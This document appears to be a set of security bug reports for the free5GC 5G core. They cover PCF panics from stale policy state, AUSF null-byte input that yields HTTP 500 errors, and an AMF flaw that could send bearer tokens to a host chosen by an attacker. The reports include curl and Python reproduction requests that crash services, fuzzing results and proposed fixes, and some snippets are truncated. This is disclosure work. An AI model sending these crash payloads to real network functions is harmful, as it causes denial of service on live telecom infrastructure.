7. Inspect `docker logs pcf` and confirm the panics shown below.

## Expected Behavior
`PCF` should remove stale `RelatedPccRuleIds` when a linked PCC rule disappears, or safely reject the update.

Expected behavior:

- app-session updates should validate that referenced PCC rules still exist before walking `pccRule.RefQosData`
- stale app-session state should not make `PUT /events-subscription` panic
- stale app-session state should not make `PATCH /app-sessions/{id}` panic

items.title: [Bugs] PCF npcf-callback POST /nudr-notify/influence-data/{supi}/{pduSessionId} panics on stale InfluenceDataToPccRule mapping
items.body:
## Bug Decription
`PCF` stores a callback-created `influenceID -> pccRuleId` mapping in `smPolicy.InfluenceDataToPccRule`. That mapping is not cleared when the same PCC rule is later removed from the live SM policy.

When the same callback `resUri` is delivered again through:

```text
POST /npcf-callback/v1/nudr-notify/influence-data/{supi}/{pduSessionId}
```

the stale update branch reuses the old mapping:

```go
if pccRuleID, ok := influenceDataToPccRule[influenceID]; ok {
    pccRule := decision.PccRules[pccRuleID]
    util.SetSmPolicyDecisionByTrafficInfluData(decision, pccRule, trafficInfluData, chgData)
}
```

If the referenced PCC rule has already been deleted, `pccRule` is nil. `SetSmPolicyDecisionByTrafficInfluData()` then dereferences it:

```go
tcData.TcId = strings.ReplaceAll(pccRule.PccRuleId, "PccRuleId", "TcId")
```

and panics.

Relevant code locations:

- callback entrypoint:
  - `NFs/pcf/internal/sbi/api_httpcallback.go:117`
  - `NFs/pcf/internal/sbi/api_httpcallback.go:159`
- stale mapping update branch:
  - `NFs/pcf/internal/sbi/processor/notifier.go:139`
  - `NFs/pcf/internal/sbi/processor/notifier.go:141`
  - `NFs/pcf/internal/sbi/processor/notifier.go:142`
- nil dereference sink:
  - `NFs/pcf/internal/util/pcc_rule.go:231`
  - `NFs/pcf/internal/util/pcc_rule.go:235`

## To Reproduce
Steps to reproduce the behavior:

1. Create a live AM policy and SM policy for a subscriber with existing UDR data, for example `imsi-208930000000001`, so that `smPolicyId=imsi-208930000000001-10` exists.

2. Seed a callback-created PCC rule:

```bash
curl -i -X POST \
  'http://10.100.200.9:8000/npcf-callback/v1/nudr-notify/influence-data/imsi-208930000000001/10' \
  -H 'Content-Type: application/json' \
  --data '[
    {
      "resUri": "http://udr.example/influence-data/inf-stale-1",
      "trafficInfluData": {
        "snssai": {"sst": 1, "sd": "010203"},
        "dnn": "internet",
        "afAppId": "inf-stale-app",
        "trafficFilters": [{"flowDescriptions": ["permit out ip from 203.0.113.7 to 198.51.100.0/24"]}],
        "trafficRoutes": [{"dnai": "mec-stale-1", "routeInfo": {"ipv4Addr": "10.60.0.1", "portNumber": 0}}]
      }
    }
  ]'
```

3. Delete the generated PCC rule from the live SM policy:

```bash
curl -i -X POST \
  'http://10.100.200.9:8000/npcf-smpolicycontrol/v1/sm-policies/imsi-208930000000001-10/update' \
  -H 'Authorization: Bearer <valid_npcf-smpolicycontrol_jwt>' \
  -H 'Content-Type: application/json' \
  --data '{
    "repPolicyCtrlReqTriggers": ["RES_MO_RE"],
    "ueInitResReq": {
      "pccRuleId": "PccRuleId-6",
      "ruleOp": "DELETE_PCC_RULE",
      "packFiltInfo": []
    }
  }'
```

4. Replay the same callback `resUri` with non-nil `trafficInfluData`:

```bash
curl -i -X POST \
  'http://10.100.200.9:8000/npcf-callback/v1/nudr-notify/influence-data/imsi-208930000000001/10' \
  -H 'Content-Type: application/json' \
  --data '[
    {
      "resUri": "http://udr.example/influence-data/inf-stale-1",
      "trafficInfluData": {
        "snssai": {"sst": 1, "sd": "010203"},
        "dnn": "internet",
        "afAppId": "inf-stale-app-2",
        "trafficFilters": [{"flowDescriptions": ["permit out ip from 203.0.113.8 to 198.51.100.0/24"]}],
        "trafficRoutes": [{"dnai": "mec-stale-2", "routeInfo": {"ipv4Addr": "10.60.0.1", "portNumber": 0}}]
      }
    }
  ]'
```

Observed result:

```text
HTTP/1.1 500 Internal Server Error
```

5. Inspect `docker logs pcf` and confirm the panic shown below.

## Expected Behavior
`PCF` should clear `InfluenceDataToPccRule` when the referenced PCC rule is deleted, or reject stale callback updates safely.

Expected behavior:

- stale callback mappings should not survive deletion of the referenced PCC rule
- `SetSmPolicyDecisionByTrafficInfluData()` should not receive a nil `pccRule`
- replaying an old callback `resUri` should not panic and return `500`

- Kernel version: `5.15.0-88-generic`
- go version: `go1.25.5 linux/amd64`

```text
    /go/src/free5gc/NFs/pcf/internal/util/pcc_rule.go:235
github.com/free5gc/pcf/internal/sbi/processor.(*Processor).HandleInfluenceDataUpdateNotify
```

items.title: [Bugs]AUSF: null byte injection in supiOrSuci causes HTTP 500 internal service failure
items.body:
**Bug Description**

The AUSF (Authentication Server Function) accepts `supiOrSuci` values containing null bytes (`\x00`) and other control characters without validation. The raw value is forwarded to the UDM in a URL path without escaping, causing Go's `net/url.Parse()` to fail. The AUSF returns HTTP 500 "System failure" instead of HTTP 400 "Bad Request".

This is a CWE-20 (Improper Input Validation) vulnerability. The HTTP 500 response leaks internal implementation details (`net/url: invalid control character in URL`), enabling backend fingerprinting. The bug is triggerable at scale: 5.4% of `special_chars` mutations produce HTTP 500.

 **To Reproduce**

**1. No config changes needed** — default free5GC deployment is vulnerable.

**2. Reproduction script:**

```python
#!/usr/bin/env python3
import http.client, json

AUSF_HOST = "127.0.0.1"  # Replace with AUSF IP
AUSF_PORT = 8000

# Bug: null bytes in supiOrSuci → HTTP 500
body_bug = json.dumps({
    "supiOrSuci": "imsi-\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
    "servingNetworkName": "5G:mnc093.mcc208.3gppnetwork.org",
    "authType": "5G_AKA"
})

conn = http.client.HTTPConnection(AUSF_HOST, AUSF_PORT, timeout=5)

             body=body_bug, headers={"Content-Type": "application/json"})

```

---

## Expected Behavior

The AUSF should validate `supiOrSuci` before constructing the UDM URL:
1. Reject values containing non-printable characters (null bytes, control chars)
2. Return HTTP 400 "Bad Request" with a descriptive ProblemDetails body
3. NOT leak internal `net/url` parse errors in the response

---

## Environment

- **free5GC Version:** Docker image free5gc-fuzz:latest
- **OS:** Ubuntu 22.04 Server
- **Kernel version:** 6.8.0-110-generic
- **Go version:** (inside container) likely Go 1.21+
- **Deployment:** Docker containers on bridge network 172.24.0.0/16

---

## Log File

```
$ grep "HTTP 500" fuzzer.log | head -3
  🔴 HTTP 500 | UEAuthenticate | special_chars | /nausf-auth/v1/ue-authentications 
    → {"error":{"status":"INTERNAL_SERVER_ERROR","message":"System failure"}}
  🔴 HTTP 500 | UEAuthenticate | seed_replay | /nausf-auth/v1/ue-authentications 
    → {"error":{"status":"INTERNAL_SERVER_ERROR","message":"System failure"}}
  🔴 HTTP 500 | UEAuthenticate | grammar_aware | /nausf-auth/v1/ue-authentications 
    → {"error":{"status":"INTERNAL_SERVER_ERROR","message":"System failure"}}

$ grep -c "HTTP 500" fuzzer.log  
1269
```

**AUSF Container Logs** (related):
```
$ docker logs fuzzing-free5gc-ausf --tail 20
... net/url: invalid control character in URL ...
```

---

```
Fuzzing testbed:
  Host: 16-core CPU, 21 GB RAM, Ubuntu 22.04
  free5GC: Docker containers, bridge network 172.24.0.0/16
  NFs: NRF, UDM, UDR, AUSF, AMF, SMF, PCF, NSSF, MongoDB
  
  Fuzzer → HTTP/1.1 → AUSF (172.24.0.50:8000)

  AUSF → HTTP GET → UDM (172.24.0.60:8000)
     ↓
  UDM: net/url.Parse() fails on \x00 in URL path
```

---

This bug was discovered through automated 5G protocol fuzzing using the 5g-fuzzer framework. The fuzzer sends mutated SBI HTTP requests based on 3GPP TS 29.500-series specifications. Key findings from fuzzing campaign:

| Strategy | Requests | HTTP 500s | Trigger Rate |
|----------|----------|-----------|-------------|
| `special_chars` | 98,304 | 4,021 | 4.1% |
| `seed_replay` | 132,428 | 7,947 | 6.0% |
| `grammar_aware` | 30,944 | 683 | 2.2% |

```
1. Attacker → AUSF: POST {"supiOrSuci": "imsi-\x00...", ...}
2. AUSF: JSON parsed OK (null bytes valid in JSON)
3. AUSF → UDM: GET /nudm-ueau/v1/imsi-\x00.../security-information/...

5. AUSF ← UDM: error
6. Attacker ← AUSF: HTTP 500 {"message": "System failure"}
```

**Contrast with C/C++ 5GCs:** The same mutation (null bytes in string fields) causes SIGSEGV/SIGABRT in OAI (C++) and Open5GS (C), but only HTTP 500 in free5GC (Go). Go's memory safety converts the crash into a recoverable error — the service survives, but the denial is equally effective.

---

**Proposed fix:**

```go

import "net/url"

var suciRegex = regexp.MustCompile(`^[a-zA-Z0-9\-]+$`)

func validateSUCI(supiOrSuci string) error {
    if strings.ContainsFunc(supiOrSuci, func(r rune) bool {
        return r < 0x20 || r > 0x7e
    }) {
        return fmt.Errorf("SUCI contains illegal characters")
    }
    return nil
}

// 2. URL-escape before constructing UDM request
udmURL := fmt.Sprintf("http://%s/nudm-ueau/v1/%s/security-information/...",
    udmAddr, url.PathEscape(supiOrSuci))
```

items.title: [Bugs]AMF trusts AUSF-provided Links href host without validation, enabling constrained SSRF and token exfiltration via malicious AUSF
items.body:
## Summary

free5gc AMF derives the destination `apiRoot` for the AUSF 5G-AKA confirmation request from `Links["5g-aka"][0].Href` returned in the AUSF UE Authentication response. The AMF parses this href with `url.Parse()` and directly uses its `Scheme` and `Host` components to construct a new NAUSF OpenAPI client, with **no validation** that the scheme is `http`/`https` or that the host matches the originally discovered AUSF SBI endpoint.

A malicious or compromised AUSF, or an attacker able to tamper with the N12 SBI response, can redirect the AMF's authenticated confirmation PUT request to an attacker-controlled HTTP(S) endpoint. The request path is constrained by the generated NAUSF client (it follows the fixed `/nausf-auth/v1/ue-authentications/{authCtxId}/5g-aka-confirmation` pattern), but the destination **host and port** are fully attacker-controlled. This can leak the AMF's NAUSF bearer token and confirmation data to the attacker, and provides a constrained SSRF primitive from the AMF's network position.

The issue affects two functions in `NFs/amf/internal/sbi/consumer/ausf_service.go`: `SendAuth5gAkaConfirmRequest` (line 116) and `SendEapAuthConfirmRequest` (line 180).

## Environment

- **free5GC Version**: v4.2.2 (git tag), AMF binary built from commit `8b0f444` (2026-04-21), amfconfig Version 1.0.9
- **OS**: Ubuntu 20.04.6 LTS (Focal Fossa)
- **Kernel version**: 5.4.0-169-generic
- **go version**: go1.25.5 linux/amd64
- **C compiler version**: gcc 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)

## Affected component

- Component: free5gc AMF
- Area: SBI consumer — AUSF authentication confirmation
- Code path: `NFs/amf/internal/sbi/consumer/ausf_service.go`
- Functions: `SendAuth5gAkaConfirmRequest` (line 104–167), `SendEapAuthConfirmRequest` (line 169–226)
- Finding key: `nas5gs.authentication_response.amf_context.ausf_http_location.format`
- Verification status: code path dynamically reachable; no scheme/host validation present in source

## Root cause

### SendAuth5gAkaConfirmRequest (line 104–117)

```go
func (s *nausfService) SendAuth5gAkaConfirmRequest(ue *amf_context.AmfUe, resStar string) (
    *models.ConfirmationDataResponse, *models.ProblemDetails, error,
) {
    var ausfUri string
    var confirmUri *url.URL
    var err error

    // Step 1: parse the Href from AUSF's SBI response body
    if len(ue.AuthenticationCtx.Links["5g-aka"]) > 0 {
        confirmUri, err = url.Parse(ue.AuthenticationCtx.Links["5g-aka"][0].Href)
    }
    if err != nil {
        return nil, nil, err
    } else {
        // Step 2: directly use confirmUri.Scheme and confirmUri.Host — zero validation
        ausfUri = fmt.Sprintf("%s://%s", confirmUri.Scheme, confirmUri.Host)
    }

    // Step 3: create an OpenAPI client whose apiRoot is derived from the untrusted URI
    client := s.getUEAuthenticationClient(ausfUri)
    if client == nil {
        return nil, nil, openapi.ReportError("ausf not found")
    }

    // Step 4: obtain an OAuth2 token scoped to NAUSF_AUTH and send the PUT
    ctx, _, err := amf_context.GetSelf().GetTokenCtx(
        models.ServiceName_NAUSF_AUTH, models.NrfNfManagementNfType_AUSF)
    // ...
    confirmResult, localErr := client.DefaultApi.UeAuthenticationsAuthCtxId5gAkaConfirmationPut(
        ctx, confirmData)
```

The key problem is in **Step 2** and **Step 3**: the AMF takes a URI string from an external NF's response body, parses out the scheme and host, and uses them to construct the `apiRoot` for a new OpenAPI client — without checking whether the scheme is `http`/`https` or whether the host matches the AUSF instance that was originally selected through NRF service discovery.

Note on Go HTTP client behavior: Go's `url.Parse()` accepts a wide range of schemes (`http`, `https`, `file`, `gopher`, `ftp`, etc.), but the standard `net/http` client will reject non-HTTP(S) schemes with an `unsupported protocol scheme` error. This means **non-HTTP schemes will fail at the HTTP client layer, not be silently followed**. The practical attack surface is therefore constrained to HTTP(S) URLs where the host/port is attacker-controlled.

### SendEapAuthConfirmRequest (line 174–180) — same pattern + additional nil-pointer concern

```go
// ausf_service.go:174-180
if len(ue.AuthenticationCtx.Links["eap-session"]) > 0 {
    confirmUri, err = url.Parse(ue.AuthenticationCtx.Links["eap-session"][0].Href)
}
if err != nil {
    logger.ConsumerLog.Errorf("url Parse failed: %+v", err)
    // Note: does NOT return on error. If url.Parse failed, confirmUri may be nil,
    // and the next line dereferences confirmUri.Scheme on a nil pointer.
}
ausfUri := fmt.Sprintf("%s://%s", confirmUri.Scheme, confirmUri.Host)
// Same: no scheme or host validation
```

This function has the same missing-validation issue, and additionally does not return when `url.Parse` fails — it logs the error and continues, which could lead to a nil-pointer dereference on `confirmUri` in the subsequent line.

## Dynamic verification

The dynamic test drove a normal 5G-AKA authentication flow through free5gc with a UERANSIM/CoreTesting state-learner UE. The UE and AUSF were not modified. The test confirmed two things:

1. **Code path reachability**: The `HandleAuthenticationResponse → SendAuth5gAkaConfirmRequest` path is exercised during normal 5G-AKA authentication.
2. **Absence of validation**: No URI scheme or host validation messages appear anywhere in the AMF logs.

The test drove the standard registration and authentication sequence:

```text
Registration Request
Authentication Request (RAND + AUTN)
Authentication Response (RES*)
→ AMF sends 5G-AKA confirmation PUT to AUSF using Links href
→ Security Mode Command (after successful auth)
```

### AMF log evidence

`amf_run_1.log` confirms that `Handle Authentication Response` was called, exercising the code path:

```text
2026-06-26T00:05:45.718500175Z Handle Authentication Response
2026-06-26T00:05:25.711037306Z Send Authentication Request
2026-06-26T00:05:25.670217733Z RegistrationType: Initial Registration
```

No URI scheme or host validation messages appear in the 603-line AMF log.

### AUSF log evidence

`ausf_run_1.log` confirms that the AMF used the Links href to send the confirmation PUT:

```text
2026-06-26T00:05:25.710766857Z | 201 | POST | /nausf-auth/v1/ue-authentications |
2026-06-26T00:05:45.724358409Z Auth5gAkaComfirmRequest
2026-06-26T00:05:45.724413262Z 5G AKA confirmation succeeded
2026-06-26T00:05:45.737071661Z | 200 | PUT  | /nausf-auth/.../5g-aka-confirmation |
```

### Scope of dynamic evidence

The current dynamic test confirms that the vulnerable code path is executed during normal operation and that no validation is performed. It does **not** include a modified-AUSF or SBI-MITM demonstration that proves the AMF actually follows a malicious Href to an attacker-controlled host. A stronger PoC would involve modifying the AUSF's UE Authentication response to return `Links["5g-aka"][0].Href = "http://127.0.0.1:9999/..."` and observing the AMF's outbound request at a listener on that port. This is noted for transparency; the code-level evidence is sufficient to establish the missing validation.

## Expected behavior

When the AMF receives an AUSF UE Authentication response containing `Links["5g-aka"][0].Href` (or `Links["eap-session"][0].Href`), it should:

1. Validate that the URI scheme is `http` or `https` before using the URI.
2. Ideally, validate that the host and port match the AUSF endpoint discovered through NRF, rather than blindly trusting the peer NF's response.

If validation fails, the AMF should treat it as an AUSF protocol error and reject the authentication flow.

## Actual behavior

When the AUSF returns a `Links["5g-aka"][0].Href`:

1. `url.Parse()` accepts the URI regardless of scheme.
2. `confirmUri.Scheme` and `confirmUri.Host` are used directly in `fmt.Sprintf` to construct `ausfUri`.
3. An OpenAPI client is created with this URI as the `apiRoot`.
4. A PUT request with an OAuth2 bearer token is sent to the resulting endpoint.
5. No scheme or host validation is performed at any point.

In the normal case (trusted AUSF), the scheme is `http` and the host is the AUSF's own SBI address, so the request succeeds as expected. The risk manifests when the AUSF is compromised or the N12 SBI response is tampered with.

## Security impact

A malicious or compromised AUSF, or an attacker able to tamper with the N12 SBI response between AMF and AUSF, can inject a controlled host and port in `Links["5g-aka"][0].Href`. The AMF then constructs the NAUSF confirmation client from this untrusted URI and may send an authenticated HTTP PUT request to an attacker-chosen HTTP(S) destination.

Potential impacts:

- **NAUSF bearer token exposure**: If OAuth2 protection is enabled, the AMF may include an NRF-issued OAuth2 access token in the `Authorization` header of the confirmation request. If the request is redirected to an attacker-controlled HTTP(S) endpoint, the token can be captured. Depending on its scope, audience, and expiry, this may allow the attacker to impersonate the AMF for NAUSF service operations accepted by the AUSF.
- **Authentication confirmation data leakage**: The PUT request body contains the `resStar` (RES*) value used in the 5G-AKA confirmation flow. RES* is not equivalent to a long-term credential and is bound to the authentication challenge, but leaking it to an unintended endpoint still violates the expected AMF–AUSF security boundary.
- **Constrained SSRF from the AMF's network position**: The request method and path are constrained by the generated NAUSF OpenAPI client, typically `/nausf-auth/v1/ue-authentications/{authCtxId}/5g-aka-confirmation`. However, the destination host and port are derived from the untrusted Href. This gives a malicious AUSF a constrained SSRF primitive that can direct AMF-originated HTTP traffic toward attacker-controlled or internal 5GC addresses.
- **Compromised NF lateral movement**: In a 5GC SBA deployment, a single compromised NF should not be able to redirect another NF's authenticated service requests to arbitrary destinations. Failing to validate that the confirmation URI belongs to the expected AUSF weakens the NF-to-NF trust boundary and increases the blast radius of a compromised AUSF.

This issue does not require a modified UE. It is an SBI-level defense-in-depth issue, but it does require either a malicious or compromised AUSF, or the ability to tamper with the AMF–AUSF SBI response.

## Suggested fix

### 1. Add URI validation

Add a validation function that checks both scheme and host, and call it in both affected functions:

```go
// validateAUSFConfirmUri checks that the parsed URI from the AUSF
// Links href has an allowed scheme (http/https) and that the host
// is not empty.
func validateAUSFConfirmUri(confirmUri *url.URL) error {
    if confirmUri == nil {
        return fmt.Errorf("confirmUri is nil")
    }
    scheme := strings.ToLower(confirmUri.Scheme)
    if scheme != "http" && scheme != "https" {
        return fmt.Errorf(
            "invalid AUSF confirm URI scheme %q, only http/https allowed",
            confirmUri.Scheme)
    }
    if confirmUri.Host == "" {
        return fmt.Errorf("AUSF confirm URI host is empty")
    }
    return nil
}
```

Integrate into `SendAuth5gAkaConfirmRequest`:

```go
if len(ue.AuthenticationCtx.Links["5g-aka"]) > 0 {
    confirmUri, err = url.Parse(ue.AuthenticationCtx.Links["5g-aka"][0].Href)
}
if err != nil {
    return nil, nil, err
}
// NEW: validate scheme and host before using the URI
if err = validateAUSFConfirmUri(confirmUri); err != nil {
    return nil, nil, err
}
ausfUri = fmt.Sprintf("%s://%s", confirmUri.Scheme, confirmUri.Host)
```

Apply the same fix in `SendEapAuthConfirmRequest`, and additionally fix the error handling so that a `url.Parse` failure causes an early return rather than proceeding to dereference a potentially nil `confirmUri`.

### 2. Stronger option: bind to the discovered AUSF endpoint

Rather than trusting the href from the AUSF response at all, the AMF could construct the confirmation URI from its own service discovery data — using the AUSF's SBI FQDN/IP and port as registered in NRF, combined with the path extracted from the href. This eliminates the trust-on-href problem entirely.

### 3. Additional hardening

- Add regression tests:
  - `TestSendAuth5gAkaConfirm_RejectsNonHttpScheme` — inject `ftp://`, `gopher://`, empty scheme → expect error.
  - `TestSendAuth5gAkaConfirm_RejectsEmptyHost` — empty host → expect error.
  - `TestSendAuth5gAkaConfirm_AcceptsValidHttp` — `http://` and `https://` with valid hosts succeed.
  - Same for `TestSendEapAuthConfirm_*`.
- Consider enabling mTLS on the N12 (AMF–AUSF) interface to prevent SBI response tampering entirely.
